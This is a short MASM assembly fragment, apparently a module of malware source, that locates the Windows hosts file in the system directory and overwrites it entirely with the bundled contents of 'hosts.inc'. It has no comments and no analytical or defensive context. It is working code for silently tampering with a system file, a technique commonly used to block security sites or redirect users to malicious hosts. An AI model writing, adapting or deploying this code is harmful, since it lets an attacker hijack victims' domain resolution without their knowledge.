IFDEF  MOD_HOST
hostfile	db	"\drivers\etc\hosts",0
	include hosts.inc
.code
sethosts proc
  LOCAL   hFile: DWORD 
  LOCAL   bWritten: DWORD  
  invoke  GetSystemDirectory, offset lpBuf1, MAX_PATH+1 
  invoke  lstrcat, offset lpBuf1, offset hostfile
  invoke  CreateFile, offset lpBuf1, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
  mov     hFile, eax
  invoke  WriteFile, hFile, offset hosts, hostsLen, addr bWritten, NULL
  invoke  CloseHandle, hFile
  ret 
sethosts endp
ENDIF